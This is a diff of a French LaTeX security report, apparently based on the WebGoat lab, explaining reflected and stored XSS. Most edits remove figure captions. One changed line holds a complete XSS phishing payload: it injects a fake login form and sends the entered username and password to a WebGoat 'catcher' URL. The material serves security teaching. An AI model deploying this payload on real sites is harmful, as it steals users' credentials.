@@ -69,7 +69,6 @@ En copiant ce code dans la barre de recherche et ensuite en cliquant sur search 
 
 
 \begin{center}
-\caption{XSS TYPE-0}
 \includegraphics[scale=0.3]{Web/assets/XSS0.png}
 \end{center}
 
@@ -81,7 +80,7 @@ Un autre exemple de l'exploitation de faille XSS de TYPE-0 pour cette fois chang
 \bigskip
 
 \begin{itemize}
-\item </form><script>function hack(){ XSSImage=new Image; XSSImage.src="http://localhost/WebGoat/catcher?PROPERTY=yes&user="+ document.phish.user.value + "&password=" + document.phish.pass.value + ""; alert("Si cela etait une vraie attaque , les informations suivantes auraient ete volees. User Name = " + document.phish.user.value + " Password = " + document.phish.pass.value);} </script><form name="phish"><br><br><HR><H3>This feature requires account login:</H3 ><br><br>Enter Username:<br><input type="text" name="user"><br>Enter Password:<br><input type="password" name = "pass"><br><input type="submit" name="login" value="login" onclick="hack()"></form><br><br><HR>
+\item </form><script>function hack(){ XSSImage=new Image; XSSImage.src="http://localhost/WebGoat/catcher?PROPERTY=yes\&user="+ document.phish.user.value + "\&password=" + document.phish.pass.value + ""; alert("Si cela etait une vraie attaque , les informations suivantes auraient ete volees. User Name = " + document.phish.user.value + " Password = " + document.phish.pass.value);} </script><form name="phish"><br><br><HR><H3>This feature requires account login:</H3 ><br><br>Enter Username:<br><input type="text" name="user"><br>Enter Password:<br><input type="password" name = "pass"><br><input type="submit" name="login" value="login" onclick="hack()"></form><br><br><HR>
 \end{itemize}
 
 \bigskip
@@ -91,7 +90,6 @@ En copiant ce code dans la barre de recherche et ensuite en cliquant sur search 
 
 
 \begin{center}
-\caption{XSS TYPE-0}
 \includegraphics[scale=0.3]{Web/assets/xss1.png}
 \end{center}
 
@@ -99,8 +97,8 @@ En copiant ce code dans la barre de recherche et ensuite en cliquant sur search 
 Voilà j'ai simplement recrée un popup qui affiche en clair les informations (identifiant et mot de passe) qui ont été demandés. Un hacker en aurait profité pour noter les informations récoltées pour ensuite les utiliser a mauvais escient.
 \end{flushleft}
 
-\subsection{XSS stocké (Stored)}\label{vulnerabilites:web:xss:stored}
-
+\subsection{XSS stocké (Stored)}
+\label{vulnerabilites:web:xss:stored}
 Le XSS STOCKE (STORED) est la faille XSS la plus dommageable. Les attaques de TYPE-1 impliquent qu'un pirate injecte un script qui sera stocké de façon permanente (par exemple dans une base de données). Un exemple assez classique de XSS de TYPE-1 est l'injection d'un script malveillant par un pirate dans un champ de commentaires sur un blog ou un post dans un forum.
 
 \begin{flushleft}
@@ -116,7 +114,6 @@ Voici un exemple de l'exploitation de faille XSS de TYPE-1. Pour rester dans la 
 
 
 \begin{center}
-\caption{XSS TYPE-1}
 \includegraphics[scale=0.3]{Web/assets/xsst1-0.png}
 \end{center}
 
@@ -127,7 +124,6 @@ En copiant ce texte dans le champ TITRE, le script dans le champ MESSAGE et  en 
 
 
 \begin{center}
-\caption{XSS TYPE-1}
 \includegraphics[scale=0.3]{Web/assets/xsst1-1.png}
 \end{center}
 
@@ -138,7 +134,6 @@ On voit clairement dans la liste des messages qu'un message à été posté par 
 \end{flushleft}
 
 \begin{center}
-\caption{XSS TYPE-1}
 \includegraphics[scale=0.3]{Web/assets/xsst1-2.png}
 \end{center}
 
@@ -160,7 +155,6 @@ Voyons maintenant un deuxième exemple ou on va exploiter une faille XSS de TYPE
 \end{itemize}
 
 \begin{center}
-\caption{XSS TYPE-1}
 \includegraphics[scale=0.3]{Web/assets/xsst100.png}
 \end{center}
 
@@ -172,7 +166,6 @@ Nous allons créer un nouveau post ou sera injecté notre nouveau code. Le code 
 
 
 \begin{center}
-\caption{XSS TYPE-1}
 \includegraphics[scale=0.3]{Web/assets/xsst101.png}
 \end{center}
 
@@ -183,7 +176,6 @@ Quand on clique sur ce post on sera redirigé vers l’url qui a été entré pe
 \end{flushleft}
 
 \begin{center}
-\caption{XSS TYPE-1}
 \includegraphics[scale=0.3]{Web/assets/xssha.png}
 \end{center}
 
@@ -210,7 +202,6 @@ Après avoir cliqué sur ce liens un popup avec le message suivant "XSS TYPE-2" 
 \bigskip
 
 \begin{center}
-\caption{XSS TYPE-1}
 \includegraphics[scale=0.3]{Web/assets/xsst2.png}
 \end{center}
 
